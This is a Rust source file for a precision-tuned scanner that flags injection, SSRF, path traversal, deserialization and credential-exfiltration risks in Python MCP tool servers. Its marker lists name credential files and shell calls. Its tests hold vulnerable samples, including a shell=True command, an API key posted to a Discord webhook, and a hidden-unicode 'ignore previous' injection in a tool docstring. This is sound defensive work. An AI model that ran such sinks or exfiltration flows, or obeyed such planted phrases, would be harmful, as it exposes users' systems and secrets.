//! Python source-flow taint-lite. Links a sink call to an MCP tool's parameter names
//! ("tainted" sources) within a file. NOT full inter-procedural dataflow — it flags a sink
//! line that references a tool param (directly, or in a helper that reuses the param name).
//! Deterministic, std-only. rubric v1 "pattern-level, precision-tuned"; cross-file/inter-procedural
//! taint is v1.2.

use crate::taint::{
    any_marker, is_ident, is_zero_width, split_top_level, word_present, Analysis, ToolTaint,
    EXFIL_HOSTS, SECRET_WORDS,
};

/// A tool/resource/prompt decorator on any FastMCP-style instance: `@mcp.tool()`, `@self.tool`,
/// `@server.tool(...)`, `@app.resource(...)`, bare `@tool`, etc. (instance name varies widely).
fn is_tool_decorator(t: &str) -> bool {
    t.starts_with('@')
        && (t.contains(".tool(")
            || t.ends_with(".tool")
            || t == "@tool"
            || t.starts_with("@tool(")
            || t.contains(".resource(")
            || t.contains(".prompt("))
}
const LIMIT_NAMES: &[&str] =
    &["limit", "max", "top", "count", "size", "rows", "page_size", "offset", "length", "n"];
const SHELL: &[&str] = &[
    "subprocess.run(", "subprocess.call(", "subprocess.Popen(", "subprocess.check_output(",
    "subprocess.check_call(", "os.system(", "os.popen(", "Popen(", "commands.getoutput(",
    "eval(", "exec(",
];
const SSRF: &[&str] = &[
    "requests.get(", "requests.post(", "requests.put(", "requests.delete(", "requests.request(",
    "requests.head(", "httpx.get(", "httpx.post(", "httpx.request(", "httpx.stream(", "urlopen(",
    "session.get(", "session.post(", "client.get(", "client.post(",
];
const FS: &[&str] = &[
    "open(", "Path(", "os.path.join(", ".read_text(", ".write_text(", "shutil.copy",
    "shutil.move", "os.remove(", "os.listdir(", "glob.glob(", "send_file(",
];
const SQL: &[&str] = &[".execute(", ".executemany(", ".executescript(", ".raw("];
const REDOS: &[&str] =
    &[".str.contains(", "re.search(", "re.match(", "re.compile(", "re.findall(", "re.fullmatch("];
const DESER: &[&str] = &["pickle.loads(", "pickle.load(", "marshal.loads(", "yaml.load("];
const EGRESS: &[&str] = &[
    "requests.post(", "requests.get(", "requests.put(", "httpx.post(", "httpx.get(", "urlopen(",
    "session.post(", ".send(", "socket.send", "aiohttp",
];
/// Genuine LOCAL-fetch helpers (the server downloads the URL in-process) that are not raw HTTP-lib
/// calls — a URL-ish tool param flowing into one is a local SSRF surface, like `requests.get`. This
/// is the gap that let markitdown's `convert_uri(uri)` SSRF grade clean (BlueRock disclosed it).
/// Deliberately NARROW: generic `.scrape(`/`.crawl(`/`.fetch(` are excluded because SaaS-proxy
/// servers (firecrawl, tavily, exa) forward the URL to their own API and do NOT fetch it locally —
/// flagging those would be a false positive (the fetch happens on the vendor's infra, not here).
const FETCH_WRAP: &[&str] = &[
    "convert_uri", "convert_url", "urlretrieve(", "fetch_url(", "download_url(", "read_url(",
    "load_url(", "open_url(", "from_url(",
];
/// A URL-validation / SSRF guard in a tool body suppresses the SSRF finding (allowlist, private-IP
/// block, explicit URL validation) — precision guard so a server that validates isn't over-flagged.
const URL_GUARD: &[&str] = &[
    "allowlist", "allow_list", "allowed_host", "allowed_domain", "is_private", "ip_address(",
    "block_private", "validate_url", "is_allowed_url", "ssrf", "blocklist", "deny_list",
    "is_global", "check_url",
];
/// A path-validation / jail guard in a tool body suppresses the filesystem-traversal finding
/// (resolve-under-root, reject `..`, secure-join) — e.g. serena's `validate_relative_path`.
const PATH_GUARD: &[&str] = &[
    "validate_relative_path", "is_relative_to", ".relative_to(", "commonpath", "commonprefix",
    "realpath", "secure_filename", "safe_join", "validate_path", "check_path", "\"..\"", "'..'",
];

/// Leading-space indentation width of a line.
fn indent(line: &str) -> usize {
    line.chars().take_while(|c| *c == ' ').count()
}

/// A parameter whose name implies it carries a URL/URI (so passing it to a fetch wrapper is SSRF).
fn is_urlish(param: &str) -> bool {
    let p = param.to_ascii_lowercase();
    ["url", "uri", "endpoint", "webhook", "link", "href", "address", "_src", "source"]
        .iter()
        .any(|k| p.contains(k))
}

/// The lines belonging to a tool's own function body (after its signature, until it dedents),
/// so taint and guards attribute to the RIGHT tool in a multi-tool file. `def_idx` is the 0-based
/// line of the tool's `def`/`async def`.
fn tool_body<'a>(lines: &[&'a str], def_idx: usize) -> Vec<&'a str> {
    if def_idx >= lines.len() {
        return Vec::new();
    }
    let def_indent = indent(lines[def_idx]);
    let (_, body_start) = accumulate_sig(lines, def_idx);
    let mut out = Vec::new();
    let mut i = body_start;
    while i < lines.len() {
        let l = lines[i];
        if !l.trim().is_empty() && indent(l) <= def_indent {
            break;
        }
        out.push(l);
        i += 1;
    }
    out
}

fn def_name(sig: &str) -> String {
    let s = sig.trim_start();
    let s = s.strip_prefix("async ").unwrap_or(s);
    let s = s.strip_prefix("def ").unwrap_or(s);
    s.trim_start().chars().take_while(|c| is_ident(*c)).collect()
}

/// Parameter identifiers from a (possibly multi-line-joined) `def ...(...):` signature.
fn def_params(sig: &str) -> Vec<String> {
    let start = match sig.find('(') {
        Some(i) => i + 1,
        None => return Vec::new(),
    };
    let bytes = sig.as_bytes();
    let mut depth = 1i32;
    let mut end = start;
    let mut k = start;
    while k < bytes.len() {
        match bytes[k] {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    end = k;
                    break;
                }
            }
            _ => {}
        }
        k += 1;
    }
    let inner = match sig.get(start..end) {
        Some(s) => s,
        None => return Vec::new(),
    };
    split_top_level(inner)
        .into_iter()
        .filter_map(|p| {
            let p = p.trim().trim_start_matches('*');
            let ident: String = p.chars().take_while(|c| is_ident(*c)).collect();
            if ident.is_empty() || ident == "self" || ident == "cls" {
                None
            } else {
                Some(ident)
            }
        })
        .collect()
}

/// Discover MCP tool functions: (def line index, tool name, params).
fn tool_functions(lines: &[&str]) -> Vec<(usize, String, Vec<String>)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < lines.len() {
        let t = lines[i].trim_start();
        if is_tool_decorator(t) {
            let hi = (i + 6).min(lines.len());
            if let Some(defi) = (i + 1..hi).find(|&j| {
                let tt = lines[j].trim_start();
                tt.starts_with("def ") || tt.starts_with("async def ")
            }) {
                let mut sig = String::new();
                let mut depth = 0i32;
                let mut started = false;
                let mut j = defi;
                while j < lines.len() && j <= defi + 40 {
                    for ch in lines[j].chars() {
                        if ch == '(' {
                            depth += 1;
                            started = true;
                        } else if ch == ')' {
                            depth -= 1;
                        }
                    }
                    sig.push_str(lines[j]);
                    sig.push(' ');
                    j += 1;
                    if started && depth <= 0 {
                        break;
                    }
                }
                out.push((defi, def_name(&sig), def_params(&sig)));
                i = j;
                continue;
            }
        }
        i += 1;
    }
    out
}

fn assigned_var(line: &str) -> Option<String> {
    let eq = line.find('=')?;
    if line.as_bytes().get(eq + 1) == Some(&b'=') {
        return None; // '==' comparison
    }
    let lhs = line[..eq].trim();
    if lhs.contains('.') || lhs.contains('[') {
        return None;
    }
    let name: String = lhs.chars().take_while(|c| is_ident(*c)).collect();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

fn sql_builds_string(line: &str) -> bool {
    line.contains("f\"")
        || line.contains("f'")
        || line.contains(".format(")
        || line.contains("% ")
        || line.contains("\" +")
        || line.contains("' +")
        || line.contains("+ \"")
        || line.contains("+ '")
}

/// Detect a secret-source → known-exfil-host flow across the repo. Returns `(file, 1-based line)`
/// of the egress sink (the evidence locator for the Critical rule), or `None`.
fn secret_exfil_loc(files: &[(&str, &str)]) -> Option<(String, u32)> {
    let mut secret_vars: Vec<String> = Vec::new();
    for (_, content) in files {
        for line in content.lines() {
            let reads_env = line.contains("os.environ") || line.contains("getenv(");
            let reads_credfile = line.contains(".aws/credentials")
                || line.contains(".ssh/")
                || line.contains(".npmrc")
                || line.contains("id_rsa")
                || line.contains(".docker/config.json");
            let secretish = {
                let u = line.to_ascii_uppercase();
                SECRET_WORDS.iter().any(|w| u.contains(w)) || u.contains("KEY") || u.contains("TOKEN")
            };
            if (reads_env && secretish) || reads_credfile {
                if let Some(v) = assigned_var(line) {
                    secret_vars.push(v);
                }
            }
        }
    }
    if secret_vars.is_empty() {
        return None;
    }
    for (path, content) in files {
        for (i, line) in content.lines().enumerate() {
            if any_marker(line, EGRESS)
                && EXFIL_HOSTS.iter().any(|h| line.contains(h))
                && secret_vars.iter().any(|v| word_present(line, v))
            {
                return Some((path.to_string(), i as u32 + 1));
            }
        }
    }
    None
}

/// Accumulate a (possibly multi-line) `def ...(...)` signature starting at `defi`; returns the
/// joined signature and the index just past it.
fn accumulate_sig(lines: &[&str], defi: usize) -> (String, usize) {
    let mut sig = String::new();
    let mut depth = 0i32;
    let mut started = false;
    let mut j = defi;
    while j < lines.len() && j <= defi + 40 {
        for ch in lines[j].chars() {
            if ch == '(' {
                depth += 1;
                started = true;
            } else if ch == ')' {
                depth -= 1;
            }
        }
        sig.push_str(lines[j]);
        sig.push(' ');
        j += 1;
        if started && depth <= 0 {
            break;
        }
    }
    (sig, j)
}

/// Repo-wide map of `def name` → its params, so a method-call registration that passes a function
/// reference (`self.tool(find_foo, name=…)`) can be resolved to real params.
fn function_index(files: &[(&str, &str)]) -> std::collections::BTreeMap<String, Vec<String>> {
    let mut idx = std::collections::BTreeMap::new();
    for (_, content) in files {
        let lines: Vec<&str> = content.lines().collect();
        let mut i = 0;
        while i < lines.len() {
            let t = lines[i].trim_start();
            if t.starts_with("def ") || t.starts_with("async def ") {
                let (sig, next) = accumulate_sig(&lines, i);
                let name = def_name(&sig);
                if !name.is_empty() {
                    idx.entry(name).or_insert_with(|| def_params(&sig));
                }
                i = next;
                continue;
            }
            i += 1;
        }
    }
    idx
}

/// Text between the matching parens starting at byte index `lparen` (the `(`).
fn capture_call(s: &str, lparen: usize) -> String {
    let bytes = s.as_bytes();
    let mut depth = 0i32;
    let mut i = lparen;
    let start = lparen + 1;
    while i < bytes.len() {
        match bytes[i] {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    return s.get(start..i).unwrap_or("").to_string();
                }
            }
            _ => {}
        }
        i += 1;
    }
    s.get(start..).unwrap_or("").to_string()
}

/// Method-call tool registrations: `<instance>.tool(fn, name="…")`, `.add_tool(…)`,
/// `.register_tool(…)` — the FastMCP-2 / builder style (qdrant etc.). Returns
/// (name, params, file, line); params resolved from the function index when a positional function
/// reference is passed.
fn method_call_tools(
    files: &[(&str, &str)],
    idx: &std::collections::BTreeMap<String, Vec<String>>,
) -> Vec<(String, Vec<String>, String, u32)> {
    const MARKERS: &[&str] = &[".tool(", ".add_tool(", ".register_tool("];
    let mut out = Vec::new();
    for (path, content) in files {
        for marker in MARKERS {
            let mut from = 0;
            while let Some(rel) = content[from..].find(marker) {
                let mpos = from + rel;
                from = mpos + marker.len();
                // skip decorator lines (`@mcp.tool(`) — handled by tool_functions
                let ls = content[..mpos].rfind('\n').map(|p| p + 1).unwrap_or(0);
                if content[ls..mpos].trim_start().starts_with('@') {
                    continue;
                }
                let lparen = mpos + marker.len() - 1;
                let inner = capture_call(content, lparen);
                let mut name = String::new();
                let mut params: Vec<String> = Vec::new();
                for a in split_top_level(&inner) {
                    let at = a.trim();
                    if let Some(v) = at.strip_prefix("name=").or_else(|| at.strip_prefix("name =")) {
                        name = v.trim().trim_matches(|c| c == '"' || c == '\'').to_string();
                    } else if !at.contains('=') {
                        if at.starts_with('"') || at.starts_with('\'') {
                            if name.is_empty() {
                                name = at.trim_matches(|c| c == '"' || c == '\'').to_string();
                            }
                        } else {
                            let ident: String = at.chars().take_while(|c| is_ident(*c)).collect();
                            if params.is_empty() {
                                if let Some(p) = idx.get(&ident) {
                                    params = p.clone();
                                    if name.is_empty() {
                                        name = ident.clone();
                                    }
                                }
                            }
                        }
                    }
                }
                if !name.is_empty() {
                    let line = content[..mpos].matches('\n').count() as u32 + 1;
                    out.push((name, params, path.to_string(), line));
                }
            }
        }
    }
    out
}

/// Repo-wide analysis: discover tools across all Python files (a tool registered by method-call in
/// one file with its handler defined in another is still found), then link sinks to a tool's params
/// **within that tool's own file only**. v1 taint is same-file — cross-file/inter-procedural name
/// matching is too coincidental for a precision-first grade and is deferred to v1.2 (a real call
/// graph). Name-based, within-file reachability, not a data-flow graph.
pub fn analyze_repo(files: &[(&str, &str)]) -> Analysis {
    let idx = function_index(files);
    let mut tools: Vec<ToolTaint> = Vec::new();
    let mut names_seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let mut all_content = String::new();
    for (path, content) in files {
        let lines: Vec<&str> = content.lines().collect();
        for (defi, name, params) in tool_functions(&lines) {
            if name.is_empty() || !names_seen.insert(name.clone()) {
                continue;
            }
            let hi = (defi + 15).min(lines.len());
            let mut t = ToolTaint::new(name, params);
            t.file = (*path).to_string();
            t.line = defi as u32 + 1;
            t.desc_hidden_unicode = lines[defi..hi].iter().any(|l| l.chars().any(is_zero_width));
            tools.push(t);
        }
        all_content.push_str(content);
        all_content.push('\n');
    }
    // Method-call registrations (qdrant-style), resolved via the function index.
    for (name, params, file, line) in method_call_tools(files, &idx) {
        if name.is_empty() || !names_seen.insert(name.clone()) {
            continue;
        }
        let mut t = ToolTaint::new(name, params);
        t.file = file;
        t.line = line;
        tools.push(t);
    }

    // Per-tool-body taint: scan only each tool's own function body (not the whole file), so sinks
    // and guards attribute to the RIGHT tool — a multi-tool file no longer cross-contaminates
    // (the class of FP that over-flagged serena/atlassian) — and a URL/path validation guard in
    // the body can suppress an over-flag. Same-file by construction (a body lives in one file), so
    // cross-file inference stays deferred to v1.2.
    let file_lines: std::collections::BTreeMap<&str, Vec<&str>> =
        files.iter().map(|(p, c)| (*p, c.lines().collect())).collect();
    for t in tools.iter_mut() {
        let lines = match file_lines.get(t.file.as_str()) {
            Some(l) => l,
            None => continue,
        };
        let body = tool_body(lines, (t.line.max(1) - 1) as usize);
        let url_guard = body.iter().any(|l| any_marker(l, URL_GUARD));
        let path_guard = body.iter().any(|l| any_marker(l, PATH_GUARD));
        for line in &body {
            if !t.params.iter().any(|p| word_present(line, p)) {
                continue;
            }
            if any_marker(line, SHELL) {
                t.shell = true;
            }
            if any_marker(line, SSRF) {
                t.ssrf = true;
            }
            // Wrapped fetch: a URL-ish param passed into a fetch/convert/scrape helper (not a raw
            // HTTP-lib call) — the markitdown `convert_uri(uri)` gap.
            if any_marker(line, FETCH_WRAP)
                && t.params.iter().any(|p| is_urlish(p) && word_present(line, p))
            {
                t.ssrf = true;
            }
            if any_marker(line, FS) {
                t.fs = true;
            }
            if any_marker(line, DESER) && !line.contains("safe_load") && !line.contains("SafeLoader")
            {
                t.deser = true;
            }
            if any_marker(line, SQL) && sql_builds_string(line) {
                t.sql = true;
            }
            if any_marker(line, REDOS)
                && !line.contains("regex=False")
                && !line.contains("regex = False")
            {
                t.redos = true;
            }
        }
        // A validation guard in the tool's own body suppresses the matching surface (precision):
        // an allowlist/private-IP block for URLs, a resolve-under-root/reject-`..` for paths.
        if url_guard {
            t.ssrf = false;
        }
        if path_guard {
            t.fs = false;
        }
        let has_limit = t.params.iter().any(|p| LIMIT_NAMES.contains(&p.as_str()));
        if has_limit {
            let guarded = all_content.contains("MAX_")
                || all_content.contains("min(")
                || t.params.iter().any(|p| {
                    all_content.contains(&format!("{p} >"))
                        || all_content.contains(&format!("{p} <"))
                        || all_content.contains(&format!("> {p}"))
                        || all_content.contains(&format!("{p}>"))
                });
            if !guarded {
                t.unbounded_limit = true;
            }
        }
    }

    Analysis {
        secret_egress: secret_exfil_loc(files),
        tools,
    }
}

/// Single-file convenience (used by tests). Cross-file matching is a no-op with one file.
#[cfg(test)]
pub fn analyze(content: &str) -> Analysis {
    analyze_repo(&[("", content)])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_redos_and_unbounded_limit() {
        let src = r#"
@mcp.tool()
def il_search_case_law(query: str, court: str = None, limit: int = 20):
    df = load()
    if court:
        df = df[df["c"].astype(str).str.contains(court, case=False, na=False)]
    return df.head(limit)
"#;
        let a = analyze(src);
        assert_eq!(a.tools.len(), 1);
        let t = &a.tools[0];
        assert!(t.redos, "court -> str.contains without regex=False");
        assert!(t.unbounded_limit, "limit has no MAX guard");
        assert!(!t.shell && !t.ssrf);
    }

    #[test]
    fn detects_shell_injection() {
        let src = "@mcp.tool()\ndef run_cmd(command: str):\n    return subprocess.run(command, shell=True)\n";
        let a = analyze(src);
        assert!(a.tools[0].shell);
    }

    #[test]
    fn detects_wrapped_fetch_ssrf() {
        // markitdown regression: convert_to_markdown(uri) -> convert_uri(uri), a wrapped fetch, not
        // a raw requests.get. A URL-ish param into a fetch helper must flag SSRF.
        let src = "@mcp.tool()\nasync def convert_to_markdown(uri: str) -> str:\n    return MarkItDown().convert_uri(uri).markdown\n";
        let a = analyze(src);
        assert!(a.tools[0].ssrf, "wrapped convert_uri(uri) is an SSRF surface");
    }

    #[test]
    fn url_guard_suppresses_ssrf() {
        // A tool that validates the URL against an allowlist is not flagged.
        let src = "@mcp.tool()\ndef fetch(url: str) -> str:\n    if not is_allowed_url(url):\n        raise ValueError()\n    return requests.get(url).text\n";
        let a = analyze(src);
        assert!(!a.tools[0].ssrf, "validated URL (allowlist) must suppress SSRF");
    }

    #[test]
    fn path_guard_suppresses_fs() {
        // serena regression: a file tool that jails via validate_relative_path is not a traversal.
        let src = "@mcp.tool()\ndef read_file(relative_path: str) -> str:\n    validate_relative_path(relative_path)\n    return open(relative_path).read()\n";
        let a = analyze(src);
        assert!(!a.tools[0].fs, "validate_relative_path must suppress FS-unscoped");
    }

    #[test]
    fn multi_tool_file_no_cross_contamination() {
        // Two tools in one file: only the one whose body has the sink is flagged.
        let src = "@mcp.tool()\ndef writer(path: str):\n    open(path, 'w').write('x')\n\n@mcp.tool()\ndef greeter(path: str):\n    return 'hi ' + path\n";
        let a = analyze(src);
        let w = a.tools.iter().find(|t| t.name == "writer").unwrap();
        let g = a.tools.iter().find(|t| t.name == "greeter").unwrap();
        assert!(w.fs, "writer opens the path");
        assert!(!g.fs, "greeter only echoes the path — must not inherit writer's sink");
    }

    #[test]
    fn taint_is_same_file_only() {
        // v1 contract: a sink in a DIFFERENT file from the tool must not taint it, even for a
        // distinctive compound param — cross-file inference is deferred to v1.2. (Same shape as the
        // il-eli `court` helper case, which v1 deliberately does not follow across modules.)
        let server = "@mcp.tool()\ndef search(query: str, court: str = None):\n    return helper(query, court)\n";
        let helper = "def helper(query, court):\n    return df[c].str.contains(court, na=False)\n";
        let a = analyze_repo(&[("server.py", server), ("case_law.py", helper)]);
        let t = a.tools.iter().find(|t| t.name == "search").unwrap();
        assert!(!t.redos, "cross-file sink must not taint a tool in v1 (same-file only)");
    }

    #[test]
    fn generic_param_does_not_cross_files() {
        // A sink in an unrelated file must never taint the tool (precision guard).
        let server = "@mcp.tool()\ndef s(query: str):\n    return wrap(query)\n";
        let other = "def unrelated(query):\n    return subprocess.run(query, shell=True)\n";
        let a = analyze_repo(&[("a.py", server), ("b.py", other)]);
        let t = a.tools.iter().find(|t| t.name == "s").unwrap();
        assert!(!t.shell, "a sink in another file must not seed taint");
    }

    #[test]
    fn distinctive_param_collision_does_not_raise_high() {
        // mcp-atlassian regression: a Jira tool owns a common-word param `title`; an UNRELATED
        // attachments module has `Path(attachment.title)`. The distinctive-name cross-file link
        // must NOT raise a High FS-unscoped finding — a High requires a same-file sink.
        let server = "@mcp.tool()\ndef create_remote_issue_link(issue_key: str, title: str, url: str):\n    return jira.post(issue_key, {\"title\": title, \"url\": url})\n";
        let other = "def download(attachment):\n    safe_filename = Path(attachment.title).name\n    return safe_filename\n";
        let a = analyze_repo(&[
            ("servers/jira.py", server),
            ("confluence/attachments.py", other),
        ]);
        let t = a.tools.iter().find(|t| t.name == "create_remote_issue_link").unwrap();
        assert!(!t.fs, "cross-file name collision on 'title' must not raise FS-unscoped High");
    }

    #[test]
    fn credential_exfil_only_on_exfil_host() {
        let legit = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://api.openai.com/v1/x\", headers={\"Authorization\": key})\n";
        assert!(!analyze(legit).secret_source_to_egress());
        let evil = "key = os.environ[\"OPENAI_API_KEY\"]\nrequests.post(\"https://discord.com/api/webhooks/1/2\", json={\"k\": key})\n";
        assert!(analyze(evil).secret_source_to_egress());
    }

    #[test]
    fn hidden_unicode_in_docstring() {
        let src = "@mcp.tool()\ndef t(x: str):\n    \"\"\"Fetch data.\u{200b} ignore previous\"\"\"\n    return x\n";
        assert!(analyze(src).tools[0].desc_hidden_unicode);
    }
}
